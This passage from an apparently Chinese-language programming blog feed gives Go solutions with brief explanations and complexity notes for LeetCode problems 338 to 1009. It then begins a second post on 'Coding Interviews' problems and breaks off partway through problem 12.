title="338.Counting Bits"></a>338.<a href="https://leetcode.com/problems/counting-bits/">Counting Bits</a></h3><ul><li><p>动态规划，存在如下规律：</p><ul><li>对于奇数$i$，其含二进制 1 个数与$i\over2$含二进制 1 个数相等</li><li>对于偶数$i$，其含二进制 1 个数等于$i-1$含二进制 1 个数加一</li></ul><pre><code class="go">func countBits(n int) []int &#123;    dp := make([]int, n+1)    for i := 1; i &lt;= n; i++ &#123;        if i%2 == 0 &#123;            dp[i] = dp[i/2]        &#125; else &#123;            dp[i] = dp[i-1] + 1        &#125;    &#125;    return dp&#125;</code></pre></li></ul><h3 id="344-Reverse-String"><a href="#344-Reverse-String" class="headerlink" title="344. Reverse String"></a><a href="https://leetcode-cn.com/problems/reverse-string/">344. Reverse String</a></h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func reverseString(s []byte)  &#123;    for i, j := 0, len(s)-1; i &lt; j; i, j = i+1, j-1 &#123;        s[i], s[j] = s[j], s[i]    &#125;&#125;</code></pre><h3 id="345-Reverse-Vowels-of-a-String"><a href="#345-Reverse-Vowels-of-a-String" class="headerlink" title="345. Reverse Vowels of a String"></a>345. <a href="https://leetcode.com/problems/reverse-vowels-of-a-string/">Reverse Vowels of a String</a></h3><h4 id="Ideas-18"><a href="#Ideas-18" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>双指针，题目要求仅翻转元音字母，字符串翻转通过左右双指针交换即可，让两个指针遇到非元音字母时跳过<ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$（Go 中为$O(n)$）</li></ul></li></ul><h4 id="Solutions-18"><a href="#Solutions-18" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>双指针</p><pre><code class="go">func reverseVowels(s string) string &#123;    tmp := []byte(s)    pa, pb := 0, len(s)-1    for pa &lt; pb &#123;        for pa &lt; len(s) &amp;&amp; !strings.Contains(&quot;aeiouAEIOU&quot;, string(tmp[pa])) &#123;            pa++        &#125;        for pb &gt; 0 &amp;&amp; !strings.Contains(&quot;aeiouAEIOU&quot;, string(tmp[pb])) &#123;            pb--        &#125;        if pa &lt; pb &#123;            tmp[pa], tmp[pb] = tmp[pb], tmp[pa]            pa++            pb--        &#125;    &#125;    return string(tmp)&#125;</code></pre></li></ul><h2 id="401-500"><a href="#401-500" class="headerlink" title="401-500"></a>401-500</h2><h3 id="415-Add-Strings"><a href="#415-Add-Strings" class="headerlink" title="415. Add Strings"></a><a href="https://leetcode-cn.com/problems/add-strings/">415. Add Strings</a></h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><blockquote><p>效率不够高，如何优化？</p></blockquote><pre><code class="go">func addStrings(num1 string, num2 string) string &#123;    carry := 0    ret := &quot;&quot;    for i, j := len(num1) - 1, len(num2) - 1; i &gt;= 0 || j &gt;= 0 || carry != 0; i, j = i - 1, j - 1 &#123;        var a, b int        if i &gt;= 0 &#123;            a = int(num1[i] - &#39;0&#39;)        &#125;        if j &gt;= 0 &#123;            b = int(num2[j] - &#39;0&#39;)        &#125;        result := a + b + carry        ret = strconv.Itoa(result%10) + ret        carry = result / 10    &#125;    return ret&#125;</code></pre><h3 id="434-Number-of-Segments-in-a-String"><a href="#434-Number-of-Segments-in-a-String" class="headerlink" title="434. Number of Segments in a String"></a><a href="https://leetcode-cn.com/problems/number-of-segments-in-a-string/">434. Number of Segments in a String</a></h3><p>题目要求统计单词数量，因此统计中间的空格数量即可。设置一个 <code>flag</code>，遇到非空格时变为 <code>true</code>，当为真时统计数量。</p><pre><code class="go">func countSegments(s string) int &#123;    count := 0    var flag bool    for _, v := range s &#123;        if v != &#39; &#39; &#123;            flag = true        &#125; else if flag &#123;            count++            flag = false        &#125;    &#125;    if len(s) == 0 || s[len(s)-1] == &#39; &#39; &#123;        // 空字符串或存在空格        return count    &#125;    return count + 1&#125;</code></pre><h3 id="437-Path-Sum-III"><a href="#437-Path-Sum-III" class="headerlink" title="437. Path Sum III"></a><a href="https://leetcode-cn.com/problems/path-sum-iii/">437. Path Sum III</a></h3><h4 id="回溯-1"><a href="#回溯-1" class="headerlink" title="回溯"></a>回溯</h4><ul><li>时间复杂度：$O(n^{2})$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */var count intfunc pathSum(root *TreeNode, targetSum int) int &#123;    count = 0    preOrder(root, targetSum)    return count&#125;func preOrder(root *TreeNode, targetSum int) &#123;    if root == nil &#123;        return    &#125;    dfs(root, targetSum)    preOrder(root.Left, targetSum)    preOrder(root.Right, targetSum)&#125;func dfs(root *TreeNode, targetSum int) &#123;    if root == nil &#123;        return    &#125;    targetSum -= root.Val    if targetSum == 0 &#123;        count++    &#125;    dfs(root.Left, targetSum)    dfs(root.Right, targetSum)&#125;</code></pre><h3 id="448-Find-All-Numbers-Disappeared-in-an-Array"><a href="#448-Find-All-Numbers-Disappeared-in-an-Array" class="headerlink" title="448. Find All Numbers Disappeared in an Array"></a><a href="https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/">448. Find All Numbers Disappeared in an Array</a></h3><p>使用额外数组按下标存储原数组元素，再将为 0 的数据返回。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func findDisappearedNumbers(nums []int) []int &#123;    arr := make([]int, len(nums))    for i := range nums &#123;        arr[nums[i]-1] = 1    &#125;    res := make([]int, 0)    // 存放结果    for i := range arr &#123;        if arr[i] == 0 &#123;            res = append(res, i + 1)        &#125;    &#125;    return res&#125;</code></pre><p>优化，将每个数字按下标加上一个大于等于长度的值，这样除了缺失的位置，其他数字都会变大。</p><pre><code class="go">func findDisappearedNumbers(nums []int) []int &#123;    length := len(nums)    for _, v := range nums &#123;        v = (v - 1) % length        nums[v] += length    &#125;    res := make([]int, 0)    for i := range nums &#123;        if nums[i] &lt;= length &#123;            res = append(res, i + 1)        &#125;    &#125;    return res&#125;</code></pre><h3 id="453-Minimum-Moves-to-Equal-Array-Elements"><a href="#453-Minimum-Moves-to-Equal-Array-Elements" class="headerlink" title="453. Minimum Moves to Equal Array Elements"></a><a href="https://leetcode-cn.com/problems/minimum-moves-to-equal-array-elements/">453. Minimum Moves to Equal Array Elements</a></h3><h4 id="数学-1"><a href="#数学-1" class="headerlink" title="数学"></a>数学</h4><p>设 $n$ 为数组长度，则有：</p><p>$result = sum(nums) - n * min(nums)$</p><ul><li><p>时间复杂度：$O(n)$</p><blockquote><p>求 sum 和 min 的时间开销。在 Go 中，求 n 的时间复杂度为 $O(1)$。</p></blockquote></li><li><p>空间复杂度：$O(1)$</p></li></ul><pre><code class="go">func minMoves(nums []int) int &#123;    minNum := nums[0]    total := 0    for i := range nums &#123;        if nums[i] &lt; minNum &#123;            minNum = nums[i]        &#125;        total += nums[i]    &#125;    length := len(nums)    return total - length * minNum&#125;</code></pre><h3 id="461-Hamming-Distance"><a href="#461-Hamming-Distance" class="headerlink" title="461. Hamming Distance"></a><a href="https://leetcode-cn.com/problems/hamming-distance/">461. Hamming Distance</a></h3><h4 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h4><p>异或运算，统计 1 的个数。</p><pre><code class="go">func hammingDistance(x int, y int) int &#123;    count := 0    z := x ^ y    for z != 0 &#123;        count += z &amp; 1        z = z &gt;&gt; 1    &#125;    return count&#125;</code></pre><p>优化如下：</p><pre><code class="go">func hammingDistance(x int, y int) int &#123;    count := 0    z := x ^ y    for z != 0 &#123;        z = z &amp; (z - 1)        count++    &#125;    return count&#125;</code></pre><h3 id="470-Implement-Rand10-Using-Rand7"><a href="#470-Implement-Rand10-Using-Rand7" class="headerlink" title="470. Implement Rand10() Using Rand7()"></a><a href="https://leetcode-cn.com/problems/implement-rand10-using-rand7/">470. Implement Rand10() Using Rand7()</a></h3><h4 id="拒绝采样"><a href="#拒绝采样" class="headerlink" title="拒绝采样"></a>拒绝采样</h4><p><code>rand7() + rand7()</code> 生成 49 个数，去掉后九个数，前 40 个数每个数的出现概率都是 $1 \over 49$。</p><pre><code class="go">func rand10() int &#123;    for &#123;        row, col := rand7(), rand7()        index := (row - 1) * 7 + col        if index &lt;= 40 &#123;            return index % 10 + 1        &#125;    &#125;&#125;</code></pre><h3 id="476-Number-Complement"><a href="#476-Number-Complement" class="headerlink" title="476. Number Complement"></a><a href="https://leetcode-cn.com/problems/number-complement/">476. Number Complement</a></h3><h4 id="位运算-1"><a href="#位运算-1" class="headerlink" title="位运算"></a>位运算</h4><pre><code class="go">func findComplement(num int) int &#123;    bit := 1    for bit &lt;= num &#123;        num = num ^ bit        bit = bit &lt;&lt; 1    &#125;    return num&#125;</code></pre><h3 id="494-Target-Sum"><a href="#494-Target-Sum" class="headerlink" title="494. Target Sum"></a><a href="https://leetcode-cn.com/problems/target-sum/">494. Target Sum</a></h3><h4 id="回溯-2"><a href="#回溯-2" class="headerlink" title="回溯"></a>回溯</h4><p>简单回溯题解。</p><ul><li>时间复杂度：$O(2^{n})$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">var count intfunc findTargetSumWays(nums []int, target int) int &#123;    count = 0    dfs(nums, target, 0, 0)    return count&#125;func dfs(nums []int, target, tmp, idx int) &#123;    if idx == len(nums) &#123;        if tmp == target &#123;            count++        &#125;        return    &#125;    dfs(nums, target, tmp-nums[idx], idx+1)    dfs(nums, target, tmp+nums[idx], idx+1)&#125;</code></pre><h4 id="动态规划-3"><a href="#动态规划-3" class="headerlink" title="动态规划"></a>动态规划</h4><h3 id="495-Teemo-Attacking"><a href="#495-Teemo-Attacking" class="headerlink" title="495. Teemo Attacking"></a><a href="https://leetcode-cn.com/problems/teemo-attacking/">495. Teemo Attacking</a></h3><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><p>放一个最大值，遍历时按情况减小即可。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func findPoisonedDuration(timeSeries []int, duration int) int &#123;    ret := len(timeSeries) * duration    for i := 0; i &lt; len(timeSeries)-1; i++ &#123;        if sub := timeSeries[i+1] - timeSeries[i]; sub &lt; duration &#123;            ret -= duration - sub        &#125;    &#125;    return ret&#125;</code></pre><p>减少运算次数（好像也没减少）：</p><pre><code class="go">func findPoisonedDuration(timeSeries []int, duration int) int &#123;    ret := len(timeSeries) * duration    for i := 0; i &lt; len(timeSeries)-1; i++ &#123;        if sub := duration - (timeSeries[i+1] - timeSeries[i]); sub &gt; 0 &#123;            ret -= sub        &#125;        &#125;    return ret&#125;</code></pre><h2 id="501-600"><a href="#501-600" class="headerlink" title="501-600"></a>501-600</h2><h3 id="541-Reverse-String-II"><a href="#541-Reverse-String-II" class="headerlink" title="541. Reverse String II"></a><a href="https://leetcode-cn.com/problems/reverse-string-ii/">541. Reverse String II</a></h3><p>使用 <code>do...while...</code> 的循环解决数组长度小于 <code>k</code> 的问题。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度（Go 实现）：$O(n)$</li><li>空间复杂度（原地修改）：$O(1)$</li></ul><pre><code class="go">func reverseStr(s string, k int) string &#123;    str := []byte(s)    for n := 0; ; n += 2*k &#123;        for i, j := n, min(n+k-1, len(str)-1); i &lt; j; i, j = i+1, j-1 &#123;            str[i], str[j] = str[j], str[i]        &#125;        if n+k &gt; len(str) &#123;            break        &#125;    &#125;    return string(str)&#125;func min(a, b int) int &#123;    if a &lt; b &#123;        return a    &#125;    return b&#125;</code></pre><h3 id="543-Diameter-of-Binary-Tree"><a href="#543-Diameter-of-Binary-Tree" class="headerlink" title="543. Diameter of Binary Tree"></a><a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/">543. Diameter of Binary Tree</a></h3><h4 id="递归-9"><a href="#递归-9" class="headerlink" title="递归"></a>递归</h4><p>遍历整个树，把左右子树的深度和加起来，最大的深度和即答案。</p><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */var maxDepth intfunc diameterOfBinaryTree(root *TreeNode) int &#123;    maxDepth = 0    depth(root)    return maxDepth&#125;func depth(root *TreeNode) int &#123;    if root == nil &#123;        return 0    &#125;    l := depth(root.Left)    r := depth(root.Right)    maxDepth = max(l + r, maxDepth)    return max(l, r) + 1&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h3 id="575-Distribute-Candies"><a href="#575-Distribute-Candies" class="headerlink" title="575. Distribute Candies"></a><a href="https://leetcode-cn.com/problems/distribute-candies/">575. Distribute Candies</a></h3><h4 id="哈希表-2"><a href="#哈希表-2" class="headerlink" title="哈希表"></a>哈希表</h4><pre><code class="go">func distributeCandies(candyType []int) int &#123;    m := make(map[int]struct&#123;&#125;)    for i := range candyType &#123;        m[candyType[i]] = struct&#123;&#125;&#123;&#125;    &#125;    if half := len(candyType) / 2; len(m) &gt; half &#123;        return half    &#125;    return len(m)&#125;</code></pre><h2 id="601-700"><a href="#601-700" class="headerlink" title="601-700"></a>601-700</h2><h3 id="617-Merge-Two-Binary-Trees"><a href="#617-Merge-Two-Binary-Trees" class="headerlink" title="617. Merge Two Binary Trees"></a><a href="https://leetcode-cn.com/problems/merge-two-binary-trees/">617. Merge Two Binary Trees</a></h3><h4 id="递归-10"><a href="#递归-10" class="headerlink" title="递归"></a>递归</h4><p>递归方法合并二叉树最为简单。</p><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func mergeTrees(root1 *TreeNode, root2 *TreeNode) *TreeNode &#123;    if root1 == nil &amp;&amp; root2 == nil &#123;        // 递归出口        return nil    &#125;    if root1 == nil &#123;        return root2    &#125;    if root2 == nil &#123;        return root1    &#125;    root1.Val += root2.Val    root1.Left = mergeTrees(root1.Left, root2.Left)    root1.Right = mergeTrees(root1.Right, root2.Right)    return root1&#125;</code></pre><h2 id="701-800"><a href="#701-800" class="headerlink" title="701-800"></a>701-800</h2><h3 id="704-Binary-Search"><a href="#704-Binary-Search" class="headerlink" title="704. Binary Search"></a><a href="https://leetcode-cn.com/problems/binary-search/">704. Binary Search</a></h3><h4 id="二分查找-5"><a href="#二分查找-5" class="headerlink" title="二分查找"></a>二分查找</h4><ul><li>时间复杂度：$O(logn)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func search(nums []int, target int) int &#123;    low, high := 0, len(nums)-1    for low &lt;= high &#123;        mid := (low+high)&gt;&gt;1        if nums[mid] == target &#123;            return mid        &#125;        if nums[mid] &lt; target &#123;            low = mid + 1        &#125; else &#123;            high = mid - 1        &#125;    &#125;    return -1&#125;</code></pre><h3 id="739-Daily-Temperatures"><a href="#739-Daily-Temperatures" class="headerlink" title="739. Daily Temperatures"></a><a href="https://leetcode-cn.com/problems/daily-temperatures/">739. Daily Temperatures</a></h3><h4 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h4><pre><code class="go">func dailyTemperatures(temperatures []int) []int &#123;    res := make([]int, len(temperatures))    stack := []int&#123;&#125;    for k, v := range temperatures &#123;        for len(stack) != 0 &amp;&amp; v &gt; temperatures[stack[len(stack)-1]] &#123;            top := stack[len(stack)-1]            stack = stack[:len(stack)-1]            res[top] = k - top        &#125;        stack = append(stack, k)    &#125;    return res&#125;</code></pre><h3 id="781-Rabbits-in-Forest"><a href="#781-Rabbits-in-Forest" class="headerlink" title="781. Rabbits in Forest"></a>781. <a href="https://leetcode-cn.com/problems/rabbits-in-forest/">Rabbits in Forest</a></h3><h4 id="数组-1"><a href="#数组-1" class="headerlink" title="数组"></a>数组</h4><p>相同数字每<code>num + 1</code>个代表<code>num + 1</code>个兔子，可以使用 Map 来记录每一种数字出现的次数，当次数为 0，兔子的统计数量加上<code>num + 1</code>，非 0 时，则将其减一，不统计。</p><p>由题设，<code>answers[i] &lt; 1000</code>，因此可以使用一个长度为 1000 的数组来代替 Map。</p><pre><code class="go">func numRabbits(answers []int) int &#123;    arr := make([]int, 1000)    count := 0    for _, v := range answers &#123;        if arr[v] == 0 &#123;            arr[v] = v            count += v + 1        &#125; else &#123;            arr[v]--        &#125;    &#125;    return count&#125;</code></pre><h4 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h4><p>先统计所有数字出现的次数，通过公式计算出结果。</p><p>如 1 出现了 3 次，则表示有 $\lceil{ {x+y}\over{y+1} }\rceil\cdot(y+1)$，$y = 1$，$x = 3$，即 3 个兔子。</p><pre><code class="go">func numRabbits(answers []int) (ans int) &#123;    count := map[int]int&#123;&#125;    for _, y := range answers &#123;        count[y]++    &#125;    for y, x := range count &#123;        ans += (x + y) / (y + 1) * (y + 1)    &#125;    return&#125;</code></pre><h2 id="901-1000"><a href="#901-1000" class="headerlink" title="901-1000"></a>901-1000</h2><h3 id="912-Sort-an-Array"><a href="#912-Sort-an-Array" class="headerlink" title="912. Sort an Array"></a><a href="https://leetcode-cn.com/problems/sort-an-array/">912. Sort an Array</a></h3><h4 id="排序-2"><a href="#排序-2" class="headerlink" title="排序"></a>排序</h4><p>快速排序，快排模板。</p><pre><code class="go">func sortArray(nums []int) []int &#123;    quickSort(nums, 0, len(nums)-1)    return nums&#125;func quickSort(nums []int, low, high int) &#123;    if low &gt;= high &#123;        return    &#125;    pivot := nums[(low+high)/2]    left, right := low, high    for left &lt;= right &#123;        for left &lt;= right &amp;&amp; nums[left] &lt; pivot &#123;            left++        &#125;        for left &lt;= right &amp;&amp; nums[right] &gt; pivot &#123;            right--        &#125;        if left &lt;= right &#123;            nums[left], nums[right] = nums[right], nums[left]            left++            right--        &#125;    &#125;    quickSort(nums, low, right)    quickSort(nums, left, high)&#125;</code></pre><h3 id="946-Validate-Stack-Sequences"><a href="#946-Validate-Stack-Sequences" class="headerlink" title="946. Validate Stack Sequences"></a><a href="https://leetcode-cn.com/problems/validate-stack-sequences/">946. Validate Stack Sequences</a></h3><h4 id="模拟-1"><a href="#模拟-1" class="headerlink" title="模拟"></a>模拟</h4><pre><code class="go">func validateStackSequences(pushed []int, popped []int) bool &#123;    stack := make([]int, 0)    idx := 0    for _, v := range pushed &#123;        stack = append(stack, v)        for len(stack) &gt; 0 &amp;&amp; idx &lt; len(popped) &amp;&amp; popped[idx] == stack[len(stack)-1] &#123;            stack = stack[:len(stack)-1]            idx++        &#125;    &#125;    return len(stack) == 0&#125;</code></pre><h3 id="990-Satisfiability-of-Equality-Equations"><a href="#990-Satisfiability-of-Equality-Equations" class="headerlink" title="990. Satisfiability of Equality Equations"></a><a href="https://leetcode-cn.com/problems/satisfiability-of-equality-equations/">990. Satisfiability of Equality Equations</a></h3><p>采用并查集的思想，合并操作后判断几个元素是否在同一个集合内。</p><pre><code class="go">func equationsPossible(equations []string) bool &#123;    parent := make([]int, 26)    for i := range parent &#123;        parent[i] = i    &#125;    for _, str := range equations &#123;        if str[1] == &#39;=&#39; &#123;            x := int(str[0] - &#39;a&#39;)            y := int(str[3] - &#39;a&#39;)            union(parent, x, y)        &#125;    &#125;    for _, str := range equations &#123;        if str[1] == &#39;!&#39; &#123;            x := int(str[0] - &#39;a&#39;)            y := int(str[3] - &#39;a&#39;)            if find(parent, x) == find(parent, y) &#123;                // 不相等的两个元素在同一集合内，与条件冲突                return false            &#125;        &#125;    &#125;    return true&#125;// 合并func union(parent []int, x, y int) &#123;    x = find(parent, x)    y = find(parent, y)    parent[x] = y&#125;// 查询func find(parent []int, x int) int &#123;    if parent[x] != x &#123;        parent[x] = find(parent, parent[x])    &#125;    return parent[x]&#125;</code></pre><h2 id="1001-1100"><a href="#1001-1100" class="headerlink" title="1001-1100"></a>1001-1100</h2><h3 id="1009-Complement-of-Base-10-Integer"><a href="#1009-Complement-of-Base-10-Integer" class="headerlink" title="1009. Complement of Base 10 Integer"></a><a href="https://leetcode-cn.com/problems/complement-of-base-10-integer/">1009. Complement of Base 10 Integer</a></h3><h4 id="位运算-2"><a href="#位运算-2" class="headerlink" title="位运算"></a>位运算</h4><pre><code class="go">func bitwiseComplement(n int) int &#123;    bit := 1    if n == 0 &#123;        return n ^ bit    &#125;    for bit &lt;= n &#123;        n = n ^ bit        bit = bit &lt;&lt; 1    &#125;    return n&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;LeetCode 刷题记录。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="算法刷题" scheme="https://blog.secriy.com/categories/algorithms/"/>
    
    
    <category term="Algorithms" scheme="https://blog.secriy.com/tags/Algorithms/"/>
    
  </entry>
  
  <entry>
    <title>剑指 Offer 刷题笔记</title>
    <link href="https://blog.secriy.com/coding-interviews-practice/"/>
    <id>https://blog.secriy.com/coding-interviews-practice/</id>
    <published>2021-06-22T04:41:24.000Z</published>
    <updated>2025-02-16T07:13:36.792Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>剑指 Offer 刷题记录。</p></div><span id="more"></span><h2 id="3-数组中重复的数字"><a href="#3-数组中重复的数字" class="headerlink" title="3. 数组中重复的数字"></a>3. <a href="https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof/">数组中重复的数字</a></h2><h3 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h3><ul><li>遍历数组，将每个数字放入 Map 中，当遍历过程中发现键已在 Map 中时直接返回该键。</li><li>题目中提到数组内的数字都在 0 到 n-1 的范围内，而找到数组中重复元素的关键就是遍历过程中知道重复元素所在的位置，因此将每个元素按照 <code>numbers[i]==i</code> 的规则放到固定的位置。</li></ul><h3 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h3><ul><li><p>Map</p><blockquote><p>难度 1 分</p></blockquote><pre><code class="go">func duplicate( numbers []int ) int &#123;    m := make(map[int]bool)    for _, v := range numbers &#123;        if _, ok := m[v]; ok &#123;            return v        &#125;        m[v] = true    &#125;    return -1&#125;</code></pre></li><li><p>替换法</p><blockquote><p>难度 3 分</p></blockquote><pre><code class="go">func findRepeatNumber(nums []int) int &#123;    for i := 0; i &lt; len(nums); i++ &#123;        for nums[i] != i &#123;            if nums[i] == nums[nums[i]] &#123;                return nums[i]            &#125;            nums[i], nums[nums[i]] = nums[nums[i]], nums[i]        &#125;    &#125;    return -1&#125;</code></pre></li></ul><h2 id="4-二维数组中的查找"><a href="#4-二维数组中的查找" class="headerlink" title="4. 二维数组中的查找"></a>4. <a href="https://leetcode-cn.com/problems/er-wei-shu-zu-zhong-de-cha-zhao-lcof/">二维数组中的查找</a></h2><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p>将这个二维数组看作一个矩阵，其行列都递增排列。很明显解题方法是对比某一中间数字，不断缩小范围，所以要确定对比的数字。</p><p>从左上角入手对比并不会缩小很明显的范围，右下角同理，而左下角和右上角数字满足。</p><p>选取右上角进行对比，当前对比的数字为 num，当 target &gt; num，缩小范围，排除第一行。当 target &lt; num，排除最后一列，直到找到目标数字。</p><pre><code class="go">func findNumberIn2DArray(matrix [][]int, target int) bool &#123;    row, col := len(matrix)-1, 0    for row &gt;= 0 &amp;&amp; row &lt; len(matrix) &amp;&amp; col &lt; len(matrix[0])&#123;        if target == matrix[row][col] &#123;            return true        &#125;        if target &lt; matrix[row][col] &#123;            row--        &#125; else &#123;            col++        &#125;    &#125;    return false&#125;</code></pre><h2 id="5-替换空格"><a href="#5-替换空格" class="headerlink" title="5. 替换空格"></a>5. <a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/">替换空格</a></h2><h3 id="常规-1"><a href="#常规-1" class="headerlink" title="常规"></a>常规</h3><ul><li><p>对于字符数组（如 C 实现）的原地实现，可以先遍历一遍数组，得出空格个数 $x$，则新数组长度为 $length+2x$。扩容后使用双指针解法，从最后一个非空元素开始移到数组末尾，遇到空格新增三个目标字符，直到替换完最后一个空格。</p></li><li><p>对于 Golang 非原地实现，可以直接遍历字符串将其替换为 <code>%20</code>。</p></li></ul><pre><code class="go">func replaceSpace( s string ) string &#123;    var newString string    for _, v := range s &#123;        if string(v) == &quot; &quot;&#123;            newString += &quot;%20&quot;        &#125; else &#123;            newString += string(v)        &#125;    &#125;    return newString&#125;</code></pre><h2 id="6-从尾到头打印链表"><a href="#6-从尾到头打印链表" class="headerlink" title="6. 从尾到头打印链表"></a>6. <a href="https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof/">从尾到头打印链表</a></h2><h3 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h3><ul><li><p>简单思路是使用一个栈存储每次遍历的值，最后从栈中取出即可。</p></li><li><p>递归思路是递归调用函数，首先将最深层函数的结果返回，该方法等同于栈方案。</p></li></ul><h3 id="Solutions-1"><a href="#Solutions-1" class="headerlink" title="Solutions"></a>Solutions</h3><ul><li><p>存储结果</p><pre><code class="go">func reversePrint(head *ListNode) []int &#123;    var result []int    for head != nil&#123;        result = append(result, head.Val)        head = head.Next    &#125;    // 反转Slice    for i, j := 0, len(result)-1; i &lt; j; i, j = i+1, j-1 &#123;        result[i], result[j] = result[j], result[i]    &#125;    return result&#125;</code></pre></li><li><p>递归</p><pre><code class="go">func reversePrint(head *ListNode) []int &#123;    if head == nil &#123;        return []int&#123;&#125;    &#125;    return append(reversePrint(head.Next), head.Val)&#125;</code></pre></li></ul><h2 id="7-重建二叉树"><a href="#7-重建二叉树" class="headerlink" title="7. 重建二叉树"></a><a href="https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/">7. 重建二叉树</a></h2><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func buildTree(preorder []int, inorder []int) *TreeNode &#123;    for k, v := range inorder &#123;        if v == preorder[0] &#123;            return &amp;TreeNode&#123;                Val: v,                Left: buildTree(preorder[1:k+1], inorder[:k]),                Right: buildTree(preorder[k+1:], inorder[k+1:]),            &#125;        &#125;    &#125;    return nil&#125;</code></pre><h2 id="9-用两个栈实现队列"><a href="#9-用两个栈实现队列" class="headerlink" title="9. 用两个栈实现队列"></a>9. <a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/">用两个栈实现队列</a></h2><h3 id="Solutions-2"><a href="#Solutions-2" class="headerlink" title="Solutions"></a>Solutions</h3><ul><li><p>Common</p><pre><code class="go">type CQueue struct &#123;    Nums   []int    Length int&#125;func Constructor() CQueue &#123;    return CQueue&#123;&#125;&#125;func (this *CQueue) AppendTail(value int)  &#123;    this.Nums = append(this.Nums, value)    this.Length++&#125;func (this *CQueue) DeleteHead() int &#123;    if this.Length == 0 &#123;        return -1    &#125;    tmp := this.Nums[0]    this.Nums = this.Nums[1:]    this.Length--    return tmp&#125;</code></pre></li></ul><h2 id="10-I-斐波那契数列"><a href="#10-I-斐波那契数列" class="headerlink" title="10- I. 斐波那契数列"></a><a href="https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/">10- I. 斐波那契数列</a></h2><h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><pre><code class="go">func fib(n int) int &#123;    pre, post := 0, 1    for i := 2; i &lt;= n; i++ &#123;        pre, post = post, (pre+post)%1000000007    &#125;    if n == 0 &#123;        return pre    &#125;    return post&#125;</code></pre><h2 id="10-II-青蛙跳台阶问题"><a href="#10-II-青蛙跳台阶问题" class="headerlink" title="10- II. 青蛙跳台阶问题"></a><a href="https://leetcode-cn.com/problems/qing-wa-tiao-tai-jie-wen-ti-lcof/">10- II. 青蛙跳台阶问题</a></h2><h3 id="动态规划-1"><a href="#动态规划-1" class="headerlink" title="动态规划"></a>动态规划</h3><p>斐波那契数列解法，典型动态规划</p><pre><code class="go">func numWays(n int) int &#123;    pre, post := 1, 1    for i := 2; i &lt;= n; i++ &#123;        pre, post = post, (pre+post)%1000000007    &#125;    return post&#125;</code></pre><h2 id="11-旋转数组的最小数字"><a href="#11-旋转数组的最小数字" class="headerlink" title="11. 旋转数组的最小数字"></a>11. <a href="https://leetcode-cn.com/problems/xuan-zhuan-shu-zu-de-zui-xiao-shu-zi-lcof/">旋转数组的最小数字</a></h2><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>遍历找到逆序的第一个元素</p><pre><code class="go">func minArray(numbers []int) int &#123;    pre1, pre2 := 0, 1    length := len(numbers)    if length &lt; 2 &#123;        return numbers[0]    &#125;    for pre2 &lt; length &#123;        if numbers[pre2] &lt; numbers[pre1] &#123;            return numbers[pre2]        &#125;        pre1++        pre2++    &#125;    return numbers[0]&#125;</code></pre><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><pre><code class="go">func minArray(numbers []int) int &#123;    low, high := 0, len(numbers)-1    mid := 0    for low &lt; high &#123;        mid = (low+high)&gt;&gt;1        if numbers[mid] &lt; numbers[high] &#123;            // 右侧有序            high = mid        &#125; else if numbers[mid] &gt; numbers[high] &#123;            // 左侧有序            low = mid + 1        &#125; else &#123;            // 去重            high--        &#125;    &#125;    return numbers[low]&#125;</code></pre><h2 id="12-矩阵中的路径"><a href="#12-矩阵中的路径" class="headerlink" title="12. 矩阵中的路径"></a><a href="https://leetcode-cn.com/problems/ju-zhen-zhong-de-lu-jing-lcof/">12. 矩阵中的路径</a></h2><h3 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h3><pre><code class="go">func exist(board [][]byte, word string) bool 